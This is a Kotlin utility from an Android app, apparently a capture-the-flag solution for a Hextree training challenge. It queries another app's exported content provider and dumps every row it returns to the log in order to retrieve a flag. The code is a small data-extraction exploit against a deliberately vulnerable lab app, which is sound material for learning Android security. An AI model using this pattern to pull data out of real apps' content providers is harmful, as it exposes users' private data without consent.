package com.pachinko.intentattacksurface.utils

import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.database.DatabaseUtils
import android.util.Log
import androidx.core.net.toUri

object Flag30 {
    fun getFlag(context: Context) {
        val uri = "content://io.hextree.flag30/success".toUri()
//        val projection = arrayOf("id", "name", "value", "visible")
        try {
            val cursor: Cursor? = context.contentResolver.query(
                uri,
                null, null, null, null
            )
            cursor?.use {
                // This safely prints the entire table structure and data to Logcat
                val cursorDump = DatabaseUtils.dumpCursorToString(it)
                Log.d("Flag30", "Cursor Data:\n$cursorDump")
            } ?: run {
                Log.e("Flag30", "Cursor returned null. Check authority or visibility.")
            }
            cursor?.close()
        } catch (e: Error) {
            Log.e("Flag30", e.message.toString())
        }
    }
}
